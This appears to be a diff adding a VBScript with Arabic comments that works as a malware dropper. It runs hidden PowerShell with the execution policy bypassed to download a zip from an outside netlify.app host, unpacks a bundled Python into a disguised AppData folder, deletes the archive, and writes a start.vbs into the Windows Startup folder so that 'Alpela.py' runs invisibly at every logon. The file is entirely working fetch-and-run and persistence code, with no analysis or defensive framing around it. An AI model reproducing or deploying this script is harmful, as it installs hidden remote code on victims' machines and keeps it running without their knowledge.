@@ -1,0 +1,28 @@
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+tempZip = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\p.zip"
+appDir = WshShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Application"
+startupDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
+
+' 1. إنشاء مجلد Application
+If Not fso.FolderExists(appDir) Then fso.CreateFolder(appDir)
+
+' 2. تنزيل python.zip
+WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/python.zip' -OutFile '" & tempZip & "'""", 0, True
+
+' 3. فك الضغط فـ Application
+WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path '" & tempZip & "' -DestinationPath '" & appDir & "' -Force""", 0, True
+
+' 4. حذف الملف المؤقت
+If fso.FileExists(tempZip) Then fso.DeleteFile tempZip, True
+
+' 5. كتابة start.vbs فـ Startup
+vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
+             "WshShell.CurrentDirectory = """ & appDir & """" & vbCrLf & _
+             "WshShell.Run """"" & appDir & "\python\python.exe"" ""Alpela.py"""""", 0, False"
+
+Dim f
+Set f = fso.CreateTextFile(startupDir & "\start.vbs", True)
+f.Write vbsContent
+f.Close
